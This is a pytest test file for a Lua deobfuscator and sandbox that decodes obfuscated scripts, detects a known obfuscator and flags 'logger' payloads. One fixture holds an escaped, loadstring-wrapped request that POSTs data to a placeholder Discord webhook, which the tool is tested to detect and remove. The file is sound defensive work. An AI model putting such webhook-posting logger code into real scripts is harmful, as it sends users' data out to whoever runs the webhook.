import pytest

from deobf import deobfuscate, detect, logger, passes, sandbox, trace_behavior


def test_escapes_and_char_and_concat():
    out, _ = passes.run_static('local s=string.char(72,105).."\\x21".."\\120"')
    assert out == 'local s="Hi!x"'


def test_numbers_do_not_touch_calls():
    out, _ = passes.run_static("local n=(1+2)*(0x10-1) print(f(1+2))")
    assert out == "local n=3*15 print(f(1+2))"


def test_string_table_inline():
    out, _ = passes.run_static('local T={"a","b"} print(T[2],T[1])')
    assert 'print("b","a")' in out


def test_strings_untouched_by_passes():
    src = 'print("(1+2)", [[string.char(65)]])'
    assert passes.run_static(src)[0] == src


def test_static_unwrap():
    assert passes.unwrap_static('return loadstring("print(1)")()') == "print(1)"


def test_detect_wearedevs():
    ranked, _ = detect("--[[ v1.0.0 https://wearedevs.net/obfuscator ]] return(function(...)end)(...)")
    assert ranked[0][0] == "wearedevs"


def test_layer_capture_and_logger():
    inner = 'request({Url="https://discord.com/api/webhooks/1/abc",Method="POST",Body="x"})'
    esc = "".join("\\%d" % b for b in inner.encode())
    r = deobfuscate('return loadstring("%s")()' % esc)
    assert r.layers == 1 and r.source == inner and r.is_logger
    clean, _ = logger.remove(r.source)
    assert "discord.com" not in clean


def test_sandbox_time_limit_keeps_captures():
    r = sandbox.run('loadstring("print(1)")() while true do end', seconds=2)
    assert r.captures == ["print(1)"]


def test_sandbox_blocks_host_access():
    r = sandbox.run('print(io, os.execute, debug.sethook ~= nil, getfenv()==_G)')
    assert r.prints == ["nil\tnil\ttrue\tfalse"]


def test_trace():
    text, _ = trace_behavior('game:GetService("Players").LocalPlayer.Name="x"')
    assert 'game:GetService("Players")' in text
